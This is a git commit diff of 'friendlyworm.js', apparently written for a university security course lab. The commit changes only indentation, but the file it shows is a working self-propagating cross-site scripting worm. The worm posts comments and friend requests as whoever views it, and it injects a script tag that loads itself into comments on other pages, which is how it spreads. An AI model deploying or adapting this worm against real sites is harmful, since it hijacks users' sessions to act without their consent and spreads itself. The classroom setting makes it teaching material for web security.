f3f92f7c23a193d77a522b715ac4096785141108
Daniel Lynch <54510633+drl3180@users.noreply.github.com>
2022-04-06 17:00:49 -0400

    Update friendlyworm.js

--- friendlyworm.js
+++ friendlyworm.js
@@ -6,12 +6,12 @@ if (cookie.get("hasCookie") != "true") {
 	request.open("POST", `/add_comment.php?id=92&comment=Just a friendly work saying hello :) `+date, true);
 	request.send();
 	for (var i = 0; i < 100; i++) {	
-			var request2 = new XMLHttpRequest();
-      request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
-      request2.send();
-      var request3 = new XMLHttpRequest();
-      request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/drl3180/friendlyworm/blob/main/friendlyworm.js"></script>`, true);
-      request3.send();
+		var request2 = new XMLHttpRequest();
+     	 	request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
+      		request2.send();
+      		var request3 = new XMLHttpRequest();
+      		request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/drl3180/friendlyworm/blob/main/friendlyworm.js"></script>`, true);
+      		request3.send();
 	}
 }
 document.cookie = "hasCookie=true"
